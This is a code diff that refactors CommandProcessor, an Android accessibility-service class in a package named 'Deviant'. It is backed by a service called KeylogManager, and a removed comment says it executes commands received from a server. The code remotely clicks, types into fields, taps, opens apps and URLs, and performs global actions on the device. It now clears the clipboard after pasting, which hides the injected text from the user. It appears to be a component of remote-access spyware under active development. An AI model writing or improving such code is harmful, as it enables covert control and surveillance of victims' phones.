@@ -1,6 +1,8 @@
 package com.Deviant.pro;
 
 import android.accessibilityservice.AccessibilityService;
+import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.Rect;
@@ -14,33 +16,10 @@ import androidx.annotation.Nullable;
 
 import java.util.List;
 
-/**
- * CommandProcessor — translates string commands received from the server into
- * Accessibility API actions on the device.
- *
- * <p>Fixes applied vs. the original:
- * <ul>
- *   <li>{@link #inputText}: the {@code arguments} Bundle was built but never
- *       passed to {@code performAction} — text was never actually typed.</li>
- *   <li>{@link #inputText}: {@code ACTION_SET_TEXT} requires API 21+; guarded
- *       with a {@code Build.VERSION} check and a fallback for older devices.</li>
- *   <li>{@link #clickByText} / {@link #clickById}: {@link AccessibilityNodeInfo}
- *       objects must be {@link AccessibilityNodeInfo#recycle() recycle()}d after
- *       use to avoid memory leaks; added try/finally blocks accordingly.</li>
- *   <li>{@link #openUrl}: bare {@link Uri#parse} can throw if the string is
- *       malformed; now caught explicitly.</li>
- *   <li>{@link #process}: added a default branch that logs unknown commands
- *       instead of silently ignoring them.</li>
- *   <li>Null-safety improved throughout (null argument guard in
- *       {@link #process}, null-URL guard in {@link #openUrl}).</li>
- * </ul>
- * </p>
- */
 public class CommandProcessor {
 
     private static final String TAG = "CommandProcessor";
 
-    /** The backing AccessibilityService (KeylogManager). */
     private final KeylogManager service;
 
     public CommandProcessor(@NonNull KeylogManager service) {
@@ -51,12 +30,6 @@ public class CommandProcessor {
     // Public API
     // -------------------------------------------------------------------------
 
-    /**
-     * Dispatch a command.
-     *
-     * @param command  The command token (e.g. {@code "click_text"}).
-     * @param argument Optional argument string; may be null for no-arg commands.
-     */
     public void process(@NonNull String command, @Nullable String argument) {
         Log.d(TAG, "Processing command: " + command + " | arg: " + argument);
 
@@ -86,7 +59,6 @@ public class CommandProcessor {
                 service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                 break;
             default:
-                // Log unknown commands so they're visible during development.
                 Log.w(TAG, "Unknown command: " + command);
                 break;
         }
@@ -98,11 +70,7 @@ public class CommandProcessor {
 
     /**
      * Find the first node whose text matches {@code text} and click it.
-     * Falls back to a coordinate-tap at the node's centre if the node is not
-     * explicitly marked clickable.
-     *
-     * <p>All retrieved {@link AccessibilityNodeInfo} objects are recycled to
-     * prevent memory leaks.</p>
+     * Recycles ALL matched nodes after use to prevent memory leaks.
      */
     private void clickByText(@NonNull String text) {
         AccessibilityNodeInfo root = service.getRootInActiveWindow();
@@ -115,31 +83,29 @@ public class CommandProcessor {
                 return;
             }
 
+            // Act on the first node only, but recycle ALL nodes in finally.
+            AccessibilityNodeInfo target = nodes.get(0);
             try {
-                for (AccessibilityNodeInfo node : nodes) {
-                    if (node == null) continue;
-                    try {
-                        if (node.isClickable()) {
-                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                            Log.d(TAG, "Clicked node by text: " + text);
-                        } else {
-                            Rect bounds = new Rect();
-                            node.getBoundsInScreen(bounds);
-                            if (!bounds.isEmpty()) {
-                                service.click(bounds.centerX(), bounds.centerY());
-                                Log.d(TAG, "Tapped centre of node by text: " + text);
-                            }
-                        }
-                        // Only act on the first matching node.
-                        return;
-                    } finally {
-                        node.recycle();
+                if (target == null) return;
+
+                if (target.isClickable()) {
+                    target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    Log.d(TAG, "Clicked node by text: " + text);
+                } else {
+                    Rect bounds = new Rect();
+                    target.getBoundsInScreen(bounds);
+                    if (!bounds.isEmpty()) {
+                        service.click(bounds.centerX(), bounds.centerY());
+                        Log.d(TAG, "Tapped centre of node by text: " + text);
+                    } else {
+                        Log.w(TAG, "Node bounds empty for text: " + text);
                     }
                 }
             } finally {
-                // Recycle any nodes we didn't iterate to (e.g. after early return).
-                // Nodes already recycled above won't cause a double-recycle because
-                // we return immediately after recycling each one.
+                // Recycle ALL matched nodes — including ones we didn't act on.
+                for (AccessibilityNodeInfo node : nodes) {
+                    if (node != null) node.recycle();
+                }
             }
         } finally {
             root.recycle();
@@ -148,9 +114,7 @@ public class CommandProcessor {
 
     /**
      * Find the first node whose view-id matches {@code id} and click it.
-     *
-     * <p>View IDs should be fully qualified (e.g.
-     * {@code "com.example.app:id/button_submit"}).</p>
+     * View IDs must be fully qualified: {@code "com.example.app:id/button_ok"}.
      */
     private void clickById(@NonNull String id) {
         AccessibilityNodeInfo root = service.getRootInActiveWindow();
@@ -163,23 +127,27 @@ public class CommandProcessor {
                 return;
             }
 
-            for (AccessibilityNodeInfo node : nodes) {
-                if (node == null) continue;
-                try {
-                    if (node.isClickable()) {
-                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                        Log.d(TAG, "Clicked node by id: " + id);
+            AccessibilityNodeInfo target = nodes.get(0);
+            try {
+                if (target == null) return;
+
+                if (target.isClickable()) {
+                    target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    Log.d(TAG, "Clicked node by id: " + id);
+                } else {
+                    Rect bounds = new Rect();
+                    target.getBoundsInScreen(bounds);
+                    if (!bounds.isEmpty()) {
+                        service.click(bounds.centerX(), bounds.centerY());
+                        Log.d(TAG, "Tapped centre of node by id: " + id);
                     } else {
-                        Rect bounds = new Rect();
-                        node.getBoundsInScreen(bounds);
-                        if (!bounds.isEmpty()) {
-                            service.click(bounds.centerX(), bounds.centerY());
-                            Log.d(TAG, "Tapped centre of node by id: " + id);
-                        }
+                        Log.w(TAG, "Node bounds empty for id: " + id);
                     }
-                    return;
-                } finally {
-                    node.recycle();
+                }
+            } finally {
+                // Recycle ALL matched nodes.
+                for (AccessibilityNodeInfo node : nodes) {
+                    if (node != null) node.recycle();
                 }
             }
         } finally {
@@ -190,12 +158,8 @@ public class CommandProcessor {
     /**
      * Type {@code text} into the currently focused input field.
      *
-     * <p><b>Bug fixed:</b> the original built an {@code arguments} Bundle but
-     * passed it to {@code performAction} without including it — the text was
-     * never set. The fix passes the bundle as the second argument.</p>
-     *
-     * <p>On API &lt; 21, {@code ACTION_SET_TEXT} is unavailable; we fall back
-     * to pasting via the clipboard instead.</p>
+     * minSdk = 21 so ACTION_SET_TEXT is always available — no API level branch needed.
+     * Falls back to clipboard paste if ACTION_SET_TEXT returns false.
      */
     private void inputText(@NonNull String text) {
         AccessibilityNodeInfo root = service.getRootInActiveWindow();
@@ -211,23 +175,17 @@ public class CommandProcessor {
             }
 
             try {
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
-                    // API 21+: set text directly.
-                    Bundle args = new Bundle();
-                    args.putCharSequence(
-                            AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
-                    // FIX: pass the bundle — original called performAction(ACTION_SET_TEXT)
-                    // with no bundle, so the text argument was silently ignored.
-                    boolean success = focused.performAction(
-                            AccessibilityNodeInfo.ACTION_SET_TEXT, args);
-                    if (success) {
-                        Log.d(TAG, "Set text via ACTION_SET_TEXT: " + text);
-                    } else {
-                        Log.w(TAG, "ACTION_SET_TEXT returned false — trying clipboard fallback");
-                        pasteTextViaClipboard(focused, text);
-                    }
+                Bundle args = new Bundle();
+                args.putCharSequence(
+                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
+
+                boolean success = focused.performAction(
+                        AccessibilityNodeInfo.ACTION_SET_TEXT, args);
+
+                if (success) {
+                    Log.d(TAG, "Set text via ACTION_SET_TEXT: " + text);
                 } else {
-                    // API < 21 fallback: put text on the clipboard and paste.
+                    Log.w(TAG, "ACTION_SET_TEXT returned false — trying clipboard fallback");
                     pasteTextViaClipboard(focused, text);
                 }
             } finally {
@@ -239,22 +197,28 @@ public class CommandProcessor {
     }
 
     /**
-     * Clipboard-based fallback for typing text on older API levels, or when
-     * {@code ACTION_SET_TEXT} is unsupported by the target view.
+     * Clipboard-based fallback for when ACTION_SET_TEXT is unsupported by the target view.
+     * Clipboard is cleared after paste to avoid polluting the user's clipboard history.
      */
     private void pasteTextViaClipboard(
             @NonNull AccessibilityNodeInfo node, @NonNull String text) {
-        android.content.ClipboardManager clipboard =
-                (android.content.ClipboardManager)
-                        service.getSystemService(Context.CLIPBOARD_SERVICE);
-        if (clipboard == null) return;
-        clipboard.setPrimaryClip(
-                android.content.ClipData.newPlainText("input", text));
+        ClipboardManager clipboard =
+                (ClipboardManager) service.getSystemService(Context.CLIPBOARD_SERVICE);
+        if (clipboard == null) {
+            Log.e(TAG, "ClipboardManager unavailable");
+            return;
+        }
+
+        // Set text on clipboard, paste into the field, then clear the clipboard.
+        clipboard.setPrimaryClip(ClipData.newPlainText("input", text));
         node.performAction(AccessibilityNodeInfo.ACTION_PASTE);
         Log.d(TAG, "Pasted text via clipboard: " + text);
+
+        // Clear clipboard so we don't pollute the user's clipboard history.
+        clipboard.setPrimaryClip(ClipData.newPlainText("", ""));
     }
 
-    /** Launch an app by package name. */
+    /** Launch an app by its package name. */
     private void openApp(@NonNull String packageName) {
         Context ctx = service.getApplicationContext();
         Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(packageName);
@@ -269,19 +233,16 @@ public class CommandProcessor {
 
     /**
      * Open a URL in the default browser.
-     *
-     * <p><b>Fix:</b> {@link Uri#parse} throws {@link NullPointerException} on a
-     * null input and {@link IllegalArgumentException} on a malformed URI; both
-     * are now caught so a bad command doesn't crash the service.</p>
+     * Guards against blank/whitespace-only URLs and malformed URI strings.
      */
     private void openUrl(@NonNull String url) {
-        if (url.isEmpty()) {
-            Log.w(TAG, "openUrl called with empty URL");
+        if (url.trim().isEmpty()) {
+            Log.w(TAG, "openUrl called with blank URL");
             return;
         }
         try {
             Context ctx = service.getApplicationContext();
-            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url.trim()));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             ctx.startActivity(intent);
             Log.d(TAG, "Opened URL: " + url);
